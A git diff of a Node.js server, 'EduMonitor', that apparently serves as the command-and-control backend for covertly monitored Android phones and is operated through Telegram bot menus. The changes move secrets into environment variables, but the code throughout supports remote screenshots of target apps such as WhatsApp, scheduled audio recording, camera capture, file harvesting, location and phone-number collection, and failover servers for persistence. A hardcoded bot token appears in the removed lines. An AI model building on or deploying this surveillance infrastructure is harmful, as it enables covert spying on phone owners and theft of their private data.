@@ -1,3 +1,5 @@
+require('dotenv').config(); // Load environment variables FIRST
+
 const express = require('express');
 const axios = require('axios');
 const multer = require('multer');
@@ -9,6 +11,19 @@ const { Octokit } = require('@octokit/rest');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const os = require('os');
+
+// ============= SECURITY CHECK =============
+// Verify required environment variables are set
+const requiredEnvVars = ['MAIN_BOT_TOKEN'];
+const missingEnvVars = requiredEnvVars.filter(varName => !process.env[varName]);
+
+if (missingEnvVars.length > 0) {
+    console.error(`❌ Missing required environment variables: ${missingEnvVars.join(', ')}`);
+    console.error('Please set these in your Render environment variables or .env file');
+    if (process.env.NODE_ENV === 'production') {
+        process.exit(1); // Exit in production if missing
+    }
+}
 
 // ============= GITHUB GIST CONFIGURATION =============
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
@@ -30,29 +45,39 @@ const GIST_FILES = {
     FAILOVER_STATE: 'failover_state.json'
 };
 
-// ============= CONFIGURATION =============
-// Main bot token (primary)
-const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || '8566422839:AAFQloa-kAv7U9tSSwn09ngxvJEQcNHF_jY';
-
-// Secondary bot token (backup - different bot)
+// ============= CONFIGURATION (ALL FROM ENV VARS) =============
+// Bot tokens
+const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN;
 const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN || '';
-
-// Secondary server URL (for failover)
 const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://backup-server.onrender.com';
 
 // Current active bot token (can change during failover)
 let activeBotToken = MAIN_BOT_TOKEN;
-let activeServerUrl = `https://${process.env.RENDER_EXTERNAL_URL || 'edu-hwpy.onrender.com'}`;
+let activeServerUrl = `https://${process.env.RENDER_EXTERNAL_URL || 'localhost'}`;
 
 // Store authorized devices and their commands
 const devices = new Map();
 const userDeviceSelection = new Map();
 const userStates = new Map();
 
-// Store authorized chat IDs
-const authorizedChats = new Set([
-    '5326373447', // Your chat ID
-]);
+// Store authorized chat IDs (from environment variable)
+const authorizedChats = new Set();
+const chatIdsFromEnv = process.env.AUTHORIZED_CHAT_IDS || '';
+chatIdsFromEnv.split(',').forEach(id => {
+    const trimmedId = id.trim();
+    if (trimmedId) {
+        authorizedChats.add(trimmedId);
+    }
+});
+
+if (authorizedChats.size === 0) {
+    console.error('❌ No authorized chat IDs configured! Set AUTHORIZED_CHAT_IDS environment variable.');
+    if (process.env.NODE_ENV === 'production') {
+        process.exit(1);
+    }
+} else {
+    console.log(`✅ Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+}
 
 // Auto-collection flags
 const autoDataRequested = new Map();
@@ -66,6 +91,13 @@ let failoverState = {
     currentServerUrl: activeServerUrl,
     failoverCount: 0
 };
+
+// Encryption salt (from environment or generate one)
+const ENCRYPTION_SALT = process.env.ENCRYPTION_SALT || crypto.randomBytes(32).toString('hex');
+if (!process.env.ENCRYPTION_SALT) {
+    console.log('⚠️ ENCRYPTION_SALT not set, using generated salt (will change on restart!)');
+    console.log('   For consistent encryption, set ENCRYPTION_SALT in environment variables');
+}
 
 // ============= GITHUB GIST STORAGE FUNCTIONS =============
 
@@ -120,7 +152,6 @@ async function writeToGist(filename, data) {
             const newGistId = response.data.id;
             console.log(`✅ Created new gist with ID: ${newGistId}`);
             console.log(`⚠️ IMPORTANT: Add GIST_ID=${newGistId} to your Render environment variables!`);
-            console.log(`   Without this, data won't persist after restart!`);
             
             // Store the gist ID in a file for this session
             fs.writeFileSync(path.join(__dirname, 'current_gist_id.txt'), newGistId);
@@ -236,10 +267,13 @@ function saveLocalBackup() {
             fs.mkdirSync(backupDir, { recursive: true });
         }
         
-        // Save devices
+        // Save devices (remove sensitive data before saving)
         const devicesObj = {};
         for (const [id, device] of devices.entries()) {
-            devicesObj[id] = device;
+            // Create a sanitized copy without sensitive data
+            const sanitizedDevice = { ...device };
+            delete sanitizedDevice.pendingCommands; // Don't backup pending commands
+            devicesObj[id] = sanitizedDevice;
         }
         fs.writeFileSync(path.join(backupDir, 'devices.backup.json'), JSON.stringify(devicesObj, null, 2));
         
@@ -250,8 +284,11 @@ function saveLocalBackup() {
         }
         fs.writeFileSync(path.join(backupDir, 'autodata.backup.json'), JSON.stringify(autoDataObj, null, 2));
         
-        // Save failover state
-        fs.writeFileSync(path.join(backupDir, 'failover_state.backup.json'), JSON.stringify(failoverState, null, 2));
+        // Save failover state (remove tokens)
+        const sanitizedFailoverState = { ...failoverState };
+        delete sanitizedFailoverState.originalBotToken;
+        delete sanitizedFailoverState.currentBotToken;
+        fs.writeFileSync(path.join(backupDir, 'failover_state.backup.json'), JSON.stringify(sanitizedFailoverState, null, 2));
         
         console.log(`💾 Saved local backup in ${backupDir}`);
     } catch (error) {
@@ -291,9 +328,9 @@ function loadLocalBackup() {
         if (fs.existsSync(failoverBackup)) {
             const data = fs.readFileSync(failoverBackup, 'utf8');
             const saved = JSON.parse(data);
-            failoverState = saved;
-            activeBotToken = saved.currentBotToken || MAIN_BOT_TOKEN;
-            activeServerUrl = saved.currentServerUrl || activeServerUrl;
+            failoverState = { ...failoverState, ...saved };
+            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
+            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
             console.log(`✅ Loaded failover state from local backup`);
         }
     } catch (error) {
@@ -384,9 +421,12 @@ if (!fs.existsSync(uploadDir)) {
 
 // ============= ENCRYPTION FUNCTIONS =============
 
+// Device-specific encryption with salt
 function encryptForDevice(data, deviceId) {
     try {
-        const key = crypto.createHash('sha256').update(deviceId).digest();
+        // Combine deviceId with global salt for stronger encryption
+        const combinedKey = deviceId + ENCRYPTION_SALT;
+        const key = crypto.createHash('sha256').update(combinedKey).digest();
         const iv = key.slice(0, 16);
         const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
         let encrypted = cipher.update(data, 'utf8', 'base64');
@@ -399,11 +439,14 @@ function encryptForDevice(data, deviceId) {
 }
 
 // ============= DEVICE CONFIGURATION =============
+// Get chat IDs from environment for device configs
+const defaultChatId = Array.from(authorizedChats)[0] || '';
+
 const deviceConfigs = {
     'default': {
-        chatId: '5326373447',
+        chatId: defaultChatId,
         config: {
-            chatId: '5326373447',
+            chatId: defaultChatId,
             botToken: activeBotToken,
             serverUrl: activeServerUrl,
             pollingInterval: 15000,
@@ -488,6 +531,28 @@ const upload = multer({
 // Middleware
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+// Simple authentication middleware for admin endpoints (optional)
+const adminAuth = (req, res, next) => {
+    const authHeader = req.headers.authorization;
+    if (!authHeader) {
+        res.setHeader('WWW-Authenticate', 'Basic');
+        return res.status(401).json({ error: 'Authentication required' });
+    }
+    
+    const base64Credentials = authHeader.split(' ')[1];
+    const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
+    const [username, password] = credentials.split(':');
+    
+    const adminUsername = process.env.ADMIN_USERNAME;
+    const adminPassword = process.env.ADMIN_PASSWORD;
+    
+    if (adminUsername && adminPassword && username === adminUsername && password === adminPassword) {
+        next();
+    } else {
+        res.status(403).json({ error: 'Invalid credentials' });
+    }
+};
 
 // ============= HELPER FUNCTIONS =============
 
@@ -718,7 +783,7 @@ function getRealtimeMenuKeyboard() {
     ];
 }
 
-// ==================== INFO MENU (CONSOLIDATED) ====================
+// ==================== INFO MENU ====================
 
 function getInfoMenuKeyboard() {
     return [
@@ -1167,8 +1232,41 @@ function queueAutoDataCommands(deviceId, chatId) {
     saveDevices().catch(console.error);
 }
 
-// ============= CRITICAL: COMPLETE CONFIG ENDPOINT =============
+// ============= API ENDPOINTS =============
 
+// Health check endpoint (public, but limited info)
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'healthy', 
+        devices: devices.size,
+        authorizedChats: authorizedChats.size,
+        serverIP: getServerIP(),
+        failoverActive: failoverState.isFailedOver,
+        storageType: octokit ? 'GitHub Gist' : 'Local Files',
+        gistConfigured: !!GIST_ID,
+        timestamp: Date.now()
+    });
+});
+
+// Admin endpoints (protected with basic auth if credentials set)
+app.get('/admin/devices', adminAuth, (req, res) => {
+    const deviceList = [];
+    for (const [id, device] of devices.entries()) {
+        deviceList.push({
+            deviceId: id,
+            chatId: device.chatId,
+            lastSeen: new Date(device.lastSeen).toISOString(),
+            firstSeen: new Date(device.firstSeen).toISOString(),
+            model: device.deviceInfo?.model || 'Unknown',
+            android: device.deviceInfo?.android || 'Unknown',
+            phoneNumber: device.phoneNumber || 'Not available',
+            online: (Date.now() - device.lastSeen) < 300000
+        });
+    }
+    res.json({ total: devices.size, devices: deviceList });
+});
+
+// Public device endpoints (no auth needed for device communication)
 app.get('/api/device/:deviceId/complete-config', (req, res) => {
     const deviceId = req.params.deviceId;
     console.log(`🔐 Complete config requested for device: ${deviceId}`);
@@ -1196,8 +1294,6 @@ app.get('/api/device/:deviceId/complete-config', (req, res) => {
     console.log(`✅ Complete config sent to ${deviceId}`);
     res.json(response);
 });
-
-// ============= PHOTO UPLOAD ENDPOINT =============
 
 app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
     try {
@@ -1250,8 +1346,6 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
         res.status(500).json({ error: 'Upload failed: ' + error.message });
     }
 });
-
-// ============= DATA UPLOAD ENDPOINTS =============
 
 app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     try {
@@ -1307,28 +1401,13 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     }
 });
 
-// ============= API ENDPOINTS =============
-
-app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'healthy', 
-        devices: devices.size,
-        authorizedChats: Array.from(authorizedChats).join(', '),
-        serverIP: getServerIP(),
-        failoverActive: failoverState.isFailedOver,
-        storageType: octokit ? 'GitHub Gist' : 'Local Files',
-        gistConfigured: !!GIST_ID,
-        timestamp: Date.now()
-    });
-});
-
-app.get('/api/ping/:deviceId', (req, res) => {
+app.get('/api/ping/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
     
     if (device) {
         device.lastSeen = Date.now();
-        saveDevices().catch(console.error);
+        await saveDevices();
         res.json({ 
             status: 'alive', 
             timestamp: Date.now(),
@@ -1434,8 +1513,6 @@ app.post('/api/result/:deviceId', async (req, res) => {
     res.sendStatus(200);
 });
 
-// ============= REGISTRATION ENDPOINT =============
-
 app.post('/api/register', async (req, res) => {
     const { deviceId, deviceInfo } = req.body;
     
@@ -1522,26 +1599,6 @@ app.post('/api/register', async (req, res) => {
     });
 });
 
-app.get('/api/devices', (req, res) => {
-    const deviceList = [];
-    for (const [id, device] of devices.entries()) {
-        deviceList.push({
-            deviceId: id,
-            chatId: device.chatId,
-            lastSeen: new Date(device.lastSeen).toISOString(),
-            firstSeen: new Date(device.firstSeen).toISOString(),
-            model: device.deviceInfo?.model || 'Unknown',
-            android: device.deviceInfo?.android || 'Unknown',
-            phoneNumber: device.phoneNumber || 'Not available',
-            lastIPInfo: device.lastIPInfo || null,
-            lastLocation: device.lastLocation || null,
-            autoDataRequested: autoDataRequested.has(id),
-            online: (Date.now() - device.lastSeen) < 300000
-        });
-    }
-    res.json({ total: devices.size, devices: deviceList, failoverActive: failoverState.isFailedOver });
-});
-
 // ============= FAILOVER MANAGEMENT ENDPOINTS =============
 
 app.post('/api/failover/force', async (req, res) => {
@@ -1561,275 +1618,10 @@ app.get('/api/failover/status', (req, res) => {
         failoverActive: failoverState.isFailedOver,
         failedOverAt: failoverState.failedOverAt,
         failoverCount: failoverState.failoverCount,
-        currentBotToken: activeBotToken.substring(0, 20) + '...',
         currentServerUrl: activeServerUrl,
         storageType: octokit ? 'GitHub Gist' : 'Local Files'
     });
 });
-
-// ============= TEST ENDPOINTS =============
-
-app.get('/test', (req, res) => {
-    const serverIP = getServerIP();
-    
-    res.send(`
-        <html>
-        <head>
-            <style>
-                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
-                h1 { color: #e94560; }
-                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
-                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
-                .online { color: #4CAF50; }
-                .offline { color: #f44336; }
-                .failover-active { color: #ff9800; }
-                .success { color: #4CAF50; }
-                .warning { color: #ff9800; }
-            </style>
-        </head>
-        <body>
-            <h1>✅ EduMonitor Server v8.0 - GitHub Gist Storage</h1>
-            <div class="stats">
-                <p><b>Time:</b> ${new Date().toISOString()}</p>
-                <p><b>Server IP:</b> <code>${serverIP}</code></p>
-                <p><b>Total Devices:</b> ${devices.size}</p>
-                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-                <p><b>Storage Type:</b> <span class="${octokit ? 'success' : 'warning'}">${octokit ? '✅ GitHub Gist' : '⚠️ Local Files (No Persistence)'}</span></p>
-                <p><b>Gist Configured:</b> ${GIST_ID ? '✅ Yes' : '❌ No'}</p>
-                <p><b>Failover Active:</b> <span class="${failoverState.isFailedOver ? 'failover-active' : 'online'}">${failoverState.isFailedOver ? '⚠️ YES' : '✅ NO'}</span></p>
-                <p><b>Active Bot Token:</b> <code>${activeBotToken.substring(0, 20)}...</code></p>
-                <p><b>Active Server URL:</b> <code>${activeServerUrl}</code></p>
-                <p><b>Failover Count:</b> ${failoverState.failoverCount}</p>
-            </div>
-            
-            <h2>📱 Registered Devices (${devices.size})</h2>
-            ${Array.from(devices.entries()).map(([id, device]) => {
-                const online = (Date.now() - device.lastSeen) < 300000;
-                return `
-                    <div class="device">
-                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
-                        <p><b>ID:</b> <code>${id}</code></p>
-                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
-                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
-                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
-                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
-                    </div>
-                `;
-            }).join('')}
-        </body>
-        </html>
-    `);
-});
-
-app.get('/test-menu', async (req, res) => {
-    const chatId = '5326373447';
-    const result = await sendTelegramMessageWithKeyboard(
-        chatId,
-        "🎯 Test Menu - Use the buttons below:",
-        getMainMenuKeyboard(chatId)
-    );
-    res.json({ success: !!result });
-});
-
-// ============= CALLBACK QUERY HANDLER =============
-
-async function handleCallbackQuery(callbackQuery) {
-    const chatId = callbackQuery.message.chat.id;
-    const messageId = callbackQuery.message.message_id;
-    const data = callbackQuery.data;
-    const callbackId = callbackQuery.id;
-    
-    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
-    
-    await answerCallbackQuery(callbackId);
-    
-    if (data.startsWith('cmd:')) {
-        const command = data.substring(4);
-        await executeCommandFromButton(chatId, messageId, command, callbackId);
-        return;
-    }
-    
-    switch (data) {
-        case 'help_main':
-            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
-            await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
-            break;
-        case 'menu_screenshot':
-            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
-            break;
-        case 'menu_screenshot_settings':
-            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
-            break;
-        case 'menu_screenshot_targets':
-            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
-            break;
-        case 'menu_screenshot_quality':
-            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
-            break;
-        case 'menu_screenshot_token':
-            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
-            break;
-        case 'menu_sched_config':
-            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
-            break;
-        case 'menu_configure_schedule':
-            await sendTelegramMessage(chatId, "⚙️ *Configure Screenshot Schedule*\n\nSend: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
-            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
-            userStates.set(chatId, { state: 'awaiting_sched_config', data: {} });
-            break;
-        case 'menu_add_target':
-            await sendTelegramMessage(chatId, "📱 *Add Target App*\n\nSend the package name:\nExample: `com.whatsapp`");
-            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
-            userStates.set(chatId, { state: 'awaiting_add_target', data: {} });
-            break;
-        case 'menu_remove_target':
-            await sendTelegramMessage(chatId, "❌ *Remove Target App*\n\nSend the package name to remove:");
-            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
-            userStates.set(chatId, { state: 'awaiting_remove_target', data: {} });
-            break;
-        case 'menu_camera':
-            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
-            break;
-        case 'menu_recording':
-            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
-            break;
-        case 'menu_recording_settings':
-            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
-            break;
-        case 'menu_audio_quality':
-            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
-            break;
-        case 'menu_custom_schedule':
-            await sendTelegramMessage(chatId, "⚙️ *Set Custom Recording Schedule*\n\nFormat: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
-            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
-            userStates.set(chatId, { state: 'awaiting_custom_schedule', data: {} });
-            break;
-        case 'menu_data':
-            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
-            break;
-        case 'menu_new_data':
-            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
-            break;
-        case 'menu_all_data':
-            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
-            break;
-        case 'menu_sync_harvest':
-            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
-            break;
-        case 'menu_set_sync_interval':
-            await sendTelegramMessage(chatId, "⚙️ *Set Sync Interval*\n\nSend interval in minutes (5-720):\nExample: `60`");
-            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
-            userStates.set(chatId, { state: 'awaiting_sync_interval', data: {} });
-            break;
-        case 'menu_realtime':
-            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
-            break;
-        case 'menu_info':
-            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
-            break;
-        case 'menu_device_name':
-            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
-            break;
-        case 'menu_system':
-            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
-            break;
-        case 'menu_media':
-            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
-            break;
-        case 'menu_add_scan_path':
-            await sendTelegramMessage(chatId, "📁 *Add Scan Path*\n\nSend the folder path to scan:\nExample: `DCIM/Camera`");
-            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
-            userStates.set(chatId, { state: 'awaiting_add_scan_path', data: {} });
-            break;
-        case 'menu_remove_scan_path':
-            await sendTelegramMessage(chatId, "❌ *Remove Scan Path*\n\nSend the folder path to remove:");
-            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
-            userStates.set(chatId, { state: 'awaiting_remove_scan_path', data: {} });
-            break;
-        case 'menu_app_management':
-            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
-            break;
-        case 'menu_data_saving':
-            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
-            break;
-        case 'menu_bot_token':
-            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
-            break;
-        case 'menu_set_server_backup':
-            await sendTelegramMessage(chatId, "🤖 *Set Server Backup Tokens*\n\nFormat: `token1 chatId1 token2 chatId2`\nExample: `123456:ABC 123456789 654321:XYZ 987654321`");
-            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
-            userStates.set(chatId, { state: 'awaiting_server_backup', data: {} });
-            break;
-        case 'menu_devices':
-            const keyboard = getDeviceSelectionKeyboard(chatId);
-            await editMessageKeyboard(chatId, messageId, keyboard);
-            break;
-        case 'refresh_devices':
-            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
-            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
-            await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
-            break;
-        case 'device_stats':
-            const userDevices = getDeviceListForUser(chatId);
-            let statsMsg = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
-            userDevices.forEach((device, index) => {
-                statsMsg += `${index + 1}. ${device.name}\n`;
-                statsMsg += `   ID: ${device.id.substring(0, 8)}...\n`;
-                statsMsg += `   Last Seen: ${device.lastSeenFormatted}\n`;
-                statsMsg += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
-            });
-            await sendTelegramMessage(chatId, statsMsg);
-            break;
-        default:
-            if (data.startsWith('select_device:')) {
-                const selectedDeviceId = data.split(':')[1];
-                const device = devices.get(selectedDeviceId);
-                if (device) {
-                    userDeviceSelection.set(chatId, selectedDeviceId);
-                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
-                    await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
-                    await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
-                }
-            } else if (data === 'close_menu') {
-                await editMessageKeyboard(chatId, messageId, []);
-                await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
-            } else {
-                console.log(`⚠️ Unknown callback: ${data}`);
-            }
-            break;
-    }
-}
-
-async function executeCommandFromButton(chatId, messageId, command, callbackId) {
-    console.log(`🎯 Executing command from button: ${command}`);
-    
-    const selectedDeviceId = userDeviceSelection.get(chatId);
-    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-    
-    if (!device) {
-        await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
-        return;
-    }
-    
-    await answerCallbackQuery(callbackId, `🔄 Executing ${command}...`);
-    
-    if (!device.pendingCommands) {
-        device.pendingCommands = [];
-    }
-    
-    device.pendingCommands.push({
-        command: command,
-        originalCommand: `/${command}`,
-        messageId: messageId,
-        timestamp: Date.now()
-    });
-    await saveDevices();
-    
-    await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
-    
-    const keyboard = [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]];
-    await editMessageKeyboard(chatId, messageId, keyboard);
-}
 
 // ============= WEBHOOK ENDPOINT =============
 
@@ -2147,10 +1939,223 @@ async function handleCommand(chatId, command, messageId) {
     await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
 }
 
+// ============= CALLBACK QUERY HANDLER =============
+
+async function handleCallbackQuery(callbackQuery) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const data = callbackQuery.data;
+    const callbackId = callbackQuery.id;
+    
+    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
+    
+    await answerCallbackQuery(callbackId);
+    
+    if (data.startsWith('cmd:')) {
+        const command = data.substring(4);
+        await executeCommandFromButton(chatId, messageId, command, callbackId);
+        return;
+    }
+    
+    switch (data) {
+        case 'help_main':
+            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+            await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
+            break;
+        case 'menu_screenshot':
+            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
+            break;
+        case 'menu_screenshot_settings':
+            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
+            break;
+        case 'menu_screenshot_targets':
+            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
+            break;
+        case 'menu_screenshot_quality':
+            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
+            break;
+        case 'menu_screenshot_token':
+            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
+            break;
+        case 'menu_sched_config':
+            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
+            break;
+        case 'menu_configure_schedule':
+            await sendTelegramMessage(chatId, "⚙️ *Configure Screenshot Schedule*\n\nSend: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
+            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
+            userStates.set(chatId, { state: 'awaiting_sched_config', data: {} });
+            break;
+        case 'menu_add_target':
+            await sendTelegramMessage(chatId, "📱 *Add Target App*\n\nSend the package name:\nExample: `com.whatsapp`");
+            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
+            userStates.set(chatId, { state: 'awaiting_add_target', data: {} });
+            break;
+        case 'menu_remove_target':
+            await sendTelegramMessage(chatId, "❌ *Remove Target App*\n\nSend the package name to remove:");
+            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
+            userStates.set(chatId, { state: 'awaiting_remove_target', data: {} });
+            break;
+        case 'menu_camera':
+            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
+            break;
+        case 'menu_recording':
+            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
+            break;
+        case 'menu_recording_settings':
+            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
+            break;
+        case 'menu_audio_quality':
+            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
+            break;
+        case 'menu_custom_schedule':
+            await sendTelegramMessage(chatId, "⚙️ *Set Custom Recording Schedule*\n\nFormat: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
+            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
+            userStates.set(chatId, { state: 'awaiting_custom_schedule', data: {} });
+            break;
+        case 'menu_data':
+            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
+            break;
+        case 'menu_new_data':
+            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
+            break;
+        case 'menu_all_data':
+            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
+            break;
+        case 'menu_sync_harvest':
+            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
+            break;
+        case 'menu_set_sync_interval':
+            await sendTelegramMessage(chatId, "⚙️ *Set Sync Interval*\n\nSend interval in minutes (5-720):\nExample: `60`");
+            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
+            userStates.set(chatId, { state: 'awaiting_sync_interval', data: {} });
+            break;
+        case 'menu_realtime':
+            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
+            break;
+        case 'menu_info':
+            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
+            break;
+        case 'menu_device_name':
+            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
+            break;
+        case 'menu_system':
+            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
+            break;
+        case 'menu_media':
+            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
+            break;
+        case 'menu_add_scan_path':
+            await sendTelegramMessage(chatId, "📁 *Add Scan Path*\n\nSend the folder path to scan:\nExample: `DCIM/Camera`");
+            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
+            userStates.set(chatId, { state: 'awaiting_add_scan_path', data: {} });
+            break;
+        case 'menu_remove_scan_path':
+            await sendTelegramMessage(chatId, "❌ *Remove Scan Path*\n\nSend the folder path to remove:");
+            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
+            userStates.set(chatId, { state: 'awaiting_remove_scan_path', data: {} });
+            break;
+        case 'menu_app_management':
+            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
+            break;
+        case 'menu_data_saving':
+            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
+            break;
+        case 'menu_bot_token':
+            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
+            break;
+        case 'menu_set_server_backup':
+            await sendTelegramMessage(chatId, "🤖 *Set Server Backup Tokens*\n\nFormat: `token1 chatId1 token2 chatId2`\nExample: `123456:ABC 123456789 654321:XYZ 987654321`");
+            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
+            userStates.set(chatId, { state: 'awaiting_server_backup', data: {} });
+            break;
+        case 'menu_devices':
+            const keyboard = getDeviceSelectionKeyboard(chatId);
+            await editMessageKeyboard(chatId, messageId, keyboard);
+            break;
+        case 'refresh_devices':
+            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
+            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
+            await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
+            break;
+        case 'device_stats':
+            const userDevices = getDeviceListForUser(chatId);
+            let statsMsg = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
+            userDevices.forEach((device, index) => {
+                statsMsg += `${index + 1}. ${device.name}\n`;
+                statsMsg += `   ID: ${device.id.substring(0, 8)}...\n`;
+                statsMsg += `   Last Seen: ${device.lastSeenFormatted}\n`;
+                statsMsg += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
+            });
+            await sendTelegramMessage(chatId, statsMsg);
+            break;
+        default:
+            if (data.startsWith('select_device:')) {
+                const selectedDeviceId = data.split(':')[1];
+                const device = devices.get(selectedDeviceId);
+                if (device) {
+                    userDeviceSelection.set(chatId, selectedDeviceId);
+                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
